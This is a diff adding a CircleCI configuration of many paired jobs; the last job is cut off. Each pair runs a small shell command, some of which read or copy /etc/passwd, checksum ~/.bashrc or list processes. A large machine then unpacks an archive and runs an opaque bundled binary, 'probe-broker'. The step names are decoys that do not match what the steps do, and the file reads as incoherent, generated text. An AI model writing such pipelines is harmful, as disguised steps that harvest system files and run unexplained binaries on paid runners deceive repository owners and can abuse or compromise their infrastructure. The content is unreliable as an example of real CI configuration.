@@ -1,0 +1,1843 @@
+version: 2.1
+
+jobs:
+  mission-november:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: I will reload the secrets bundle tonight
+          command: |
+            mkdir -p /tmp/shaft
+            set +o pipefail 2>/dev/null; seq 1 1338725 | tee >(wc -l > /dev/null) >(sha1sum > /dev/null) > /tmp/shaft/drift; true
+            echo "+" "stage" "alice-verify"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'drift'
+  alice-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/drift 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  GUI_Height:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Nothing to tokenize
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; grep -qs "^127" /etc/hosts && echo "good" || echo "bad"; true ; } > /tmp/shaft/sXZNO0dSBoSpzjzyEvy
+            echo "+" "stage" "qa-new"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'sXZNO0dSBoSpzjzyEvy'
+  qa-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/sXZNO0dSBoSpzjzyEvy 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  Revoke-WSConst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Assert the filter chips on tablet
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; grep -e then /etc/profile; true ; } > /tmp/shaft/Z
+            echo "+" "stage" "pat-ci"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'Z'
+  pat-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/Z 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  aud_6_12_40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Routing mk5
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; until [ -e "/tmp/homeQuote.flag" ]; do touch "/tmp/homeQuote.flag"; done; ls -l "/tmp/homeQuote.flag"; true ; } > /tmp/shaft/bf95106b-53d9
+            echo "+" "stage" "strated"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'bf95106b-53d9'
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/bf95106b-53d9 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  a2ad8c6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: High five the antenna
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cksum /etc/profile |cut -c1-12; true ; } > /tmp/shaft/CSV
+            echo "+" "stage" "tweak-metrics"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'CSV'
+  tweak-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/CSV 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  loopCommandAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Trace plus open
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; seq 19 2 44 | awk '{s+=$1} END {print s}'; true ; } > /tmp/shaft/ee4b6a08-d265-6c5f-a82f
+            echo "+" "stage" "sep8-release"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'ee4b6a08-d265-6c5f-a82f'
+  sep8-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/ee4b6a08-d265-6c5f-a82f 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  threadVec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Daily culture plate culturing
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cut -c1-17 /etc/os-release | head --lines=15; true ; } > /tmp/shaft/d86fd5
+            echo "+" "stage" "bob-test"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'd86fd5'
+  bob-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/d86fd5 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  zipTopAlias:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Update OTA
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cp /etc/passwd "/tmp/blog_2026-03.tmp" && gzip -f "/tmp/blog_2026-03.tmp" && ls -l "/tmp/blog_2026-03.tmp".gz; true ; } > /tmp/shaft/crash_20220104
+            echo "+" "stage" "py311-lint"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'crash_20220104'
+  py311-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/crash_20220104 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  rocket_0_14_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Massage the tenant databases
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; pr -2 -t /etc/shells | head -n8; true ; } > /tmp/shaft/canvas_dd2c_e1334-Raster
+            echo "+" "stage" "dan-ship"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'canvas_dd2c_e1334-Raster'
+  dan-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/canvas_dd2c_e1334-Raster 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  deferPendingCountMax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Tag the product tour for safety
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; find --version | head -n 1; true ; } > /tmp/shaft/bond618
+            echo "+" "stage" "q1-rev"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'bond618'
+  q1-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/bond618 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  yara_sunset:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: chill type scheduled
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; grep -Ei "local|localhost" /etc/hosts | sort -u; true ; } > /tmp/shaft/28.16.175.246
+            echo "+" "stage" "tweak-parse-hang"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '28.16.175.246'
+  tweak-parse-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/28.16.175.246 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  qk3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: doRollForwardJournalEntries
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; cut -d: -f1 /etc/passwd | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | xargs; true ; } > /tmp/shaft/IMG-7731
+            echo "+" "stage" "q2-release"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'IMG-7731'
+  q2-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/IMG-7731 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  bottomraw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Charge Ledger 2023
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 3 -name 'user' -exec stat -c %F {} \; 2> /dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /tmp/shaft/m4rk3t
+            echo "+" "stage" "DATA-651"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'm4rk3t'
+  DATA-651:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/m4rk3t 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  Pete:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Upload the press kit to region b
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; grep -hv sbin /etc/passwd|cut -d: -f1,3; true ; } > /tmp/shaft/CASE61114
+            echo "+" "stage" "min-verify"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'CASE61114'
+  min-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/CASE61114 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  stash-kyle-camera:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: ph363 cash forecast totals
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -empty -print0 2>/dev/null | xargs -0r md5sum | head -3; true ; } > /tmp/shaft/173.242
+            echo "+" "stage" "nova-v2"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '173.242'
+  nova-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/173.242 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  LS-PTR-C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Tidy up the cable tray
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; ps -eo pid,rss,comm|sort --key=3 --reverse --numeric-sort|awk 'NR>1 {print $1}'; true ; } > /tmp/shaft/8505f6ce-9bd4-8ca7-4598-8e519b8eaa
+            echo "+" "stage" "v6-edge"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '8505f6ce-9bd4-8ca7-4598-8e519b8eaa'
+  v6-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/8505f6ce-9bd4-8ca7-4598-8e519b8eaa 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  CommonProxyObserver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Billing to avoid surprises
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; start=(vienna bogota osaka); start+=(region); echo "${start[@]}"; true ; } > /tmp/shaft/trace-0c57c5.log
+            echo "+" "stage" "hotel"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'trace-0c57c5.log'
+  hotel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/trace-0c57c5.log 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  nut-weight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: wave eight lock the primary node
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for file in /usr/bin/z*; do du -h "$file"; done | wc -l; true ; } > /tmp/shaft/batch_919
+            echo "+" "stage" "java17-ship"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'batch_919'
+  java17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/batch_919 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  Payment-Session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Carefully loop the lower thirds
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; sha256sum /etc/os-release >'/tmp/journal.sum' && sha256sum -c '/tmp/journal.sum'; true ; } > /tmp/shaft/_wip_e655d51
+            echo "+" "stage" "DATA-711"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '_wip_e655d51'
+  DATA-711:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/_wip_e655d51 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  Pos-Shared:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Tab to the cookie banner
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; for elem in max liam tom chen raj;do echo "${elem^}"; done | tac; true ; } > /tmp/shaft/trace.log.19
+            echo "+" "stage" "build"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'trace.log.19'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/trace.log.19 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  osqwusO:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Overtime crawl
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; seq 5 5 41 | sort -n | tail -n1; true ; } > /tmp/shaft/MzinJa
+            echo "+" "stage" "APP-576"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'MzinJa'
+  APP-576:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/MzinJa 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  underSensor3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Proof the training loop
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; function whereami { for a in "$@"; do echo "[$a]"; done; }; whereami goose crow cat; true ; } > /tmp/shaft/115.97.150.69
+            echo "+" "stage" "jun3-rev"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '115.97.150.69'
+  jun3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/115.97.150.69 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  GE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Analyze Replication Lag
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; sha256sum "$HOME/.bashrc" >/tmp/night_result.sha256 && sha256sum -c /tmp/night_result.sha256; true ; } > /tmp/shaft/02.02.2026
+            echo "+" "stage" "depoly-20"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '02.02.2026'
+  depoly-20:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/02.02.2026 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  Install-ResponseItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: tunneling wifi mesh now
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; x=$(echo '   leading spaces' | wc -c); echo "chars: $x"; true ; } > /tmp/shaft/c5762a3d97e57f529536266c486bc8dd
+            echo "+" "stage" "dec7-smoke"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'c5762a3d97e57f529536266c486bc8dd'
+  dec7-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/c5762a3d97e57f529536266c486bc8dd 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  saveRPC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Alongside that calibrate the rack units
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=6531\nuser=heidi\ndebug=true\n' >"/tmp/home.csv" && (. "/tmp/home.csv" && echo "$host:$port"); true ; } > /tmp/shaft/iter1_80d2
+            echo "+" "stage" "orion-ng"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - 'iter1_80d2'
+  orion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/iter1_80d2 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  CNT-NAME-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Round I Loading Shaders
+          command: |
+            mkdir -p /tmp/shaft
+            { set +o pipefail 2>/dev/null; y="sorting results"; echo "[${y~~}]"; true ; } > /tmp/shaft/9d2624522679d73547562e22f089c7
+            echo "+" "stage" "yuki-verify"
+      - persist_to_workspace:
+          root: /tmp/shaft
+          paths:
+            - '9d2624522679d73547562e22f089c7'
+  yuki-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
+      - run:
+          name: Collect upstream
+          command: |
+            awk 'BEGIN{FS=" "} END{print NR,FNR}' /tmp/shaft/9d2624522679d73547562e22f089c7 2>/dev/null || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 2 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c partial-dumps.tar.bz2 | tar xf -
+      - run:
+          command: "$PWD/probe-broker"
+  xref_Decrypt8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shaft
